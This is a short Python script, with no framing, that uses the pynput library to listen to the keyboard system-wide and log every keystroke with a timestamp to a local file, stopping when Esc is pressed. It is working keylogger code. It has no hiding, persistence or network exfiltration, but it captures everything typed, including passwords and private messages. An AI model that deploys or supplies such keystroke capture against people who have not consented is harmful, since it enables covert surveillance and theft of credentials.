from pynput import keyboard
import logging
import os

# Set up logging to capture keystrokes
log_dir = "./"  # Specify the current directory
log_file = os.path.join(log_dir, "key_log.txt")

# Check if the log file exists, if not, create it
if not os.path.exists(log_file):
    with open(log_file, 'w') as f:
        pass

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
